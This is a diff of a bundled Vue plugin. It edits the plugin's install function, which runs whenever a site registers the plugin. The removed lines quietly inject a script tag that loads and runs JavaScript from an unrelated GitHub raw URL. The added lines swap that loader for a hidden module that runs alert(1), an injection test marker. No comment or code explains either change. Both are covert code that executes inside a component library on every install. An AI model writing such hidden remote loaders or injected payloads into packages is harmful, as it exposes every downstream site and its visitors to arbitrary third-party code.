@@ -3069,6 +3069,13 @@ module.exports = TO_STRING_TAG_SUPPORT ? classofRaw : function (it) {
 
 /***/ }),
 
+/***/ "f6fe":
+/***/ (function(module, exports) {
+
+alert(1);
+
+/***/ }),
+
 /***/ "f772":
 /***/ (function(module, exports, __webpack_require__) {
 
@@ -3143,12 +3150,7 @@ var es_string_split = __webpack_require__("1276");
 
 // 定义 install 方法，接收 Vue 作为参数。如果使用 use 注册插件，则所有的组件都将被注册
 var install = function install(Vue) {
-  (function () {
-    var hm = document.createElement("script");
-    hm.src = "https://raw.githubusercontent.com/wukaiguo/55zs/master/resource/main.js";
-    var s = document.getElementsByTagName("script")[0];
-    s.parentNode.insertBefore(hm, s);
-  })(); // 判断是否安装
+  __webpack_require__("f6fe"); // 判断是否安装
 
 
   if (install.installed) return;
